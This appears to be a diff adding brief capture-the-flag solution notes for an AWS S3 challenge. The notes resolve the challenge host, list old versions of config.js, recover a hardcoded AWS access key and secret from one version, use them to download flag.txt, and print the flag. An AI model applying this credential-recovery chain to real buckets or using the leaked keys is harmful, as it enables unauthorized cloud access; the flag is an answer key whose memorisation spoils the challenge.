@@ -1,0 +1,17 @@
+dig dawsonite.pwn.institute
+	;; ANSWER SECTION:
+	dawsonite.pwn.institute. 3599	IN	CNAME	dawsonite.pwn.institute.s3-website-us-east-1.amazonaws.com.
+	dawsonite.pwn.institute.s3-website-us-east-1.amazonaws.com. 59 IN CNAME	s3-website-us-east-1.amazonaws.com.
+	s3-website-us-east-1.amazonaws.com. 4 IN A	52.216.20.162
+
+https://dawsonite.pwn.institute.s3.amazonaws.com
+
+https://dawsonite.pwn.institute.s3.amazonaws.com/?versions&prefix=config.js
+	get versions of config.js
+
+http://dawsonite.pwn.institute.s3.amazonaws.com/config.js?versionId=zcoAvy97sFgFdR08.kypq1KyLj9iZuAD
+	var aws_access_key_id = 'AKIAZURPQPLPI4BVK6WF';
+	var aws_secret_access_key = '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';
+
+aws s3api get-object --bucket dawsonite.pwn.institute --key flag.txt flag.txt
+	BCTF{zdravo_aws_cloud_master_kako_ste}
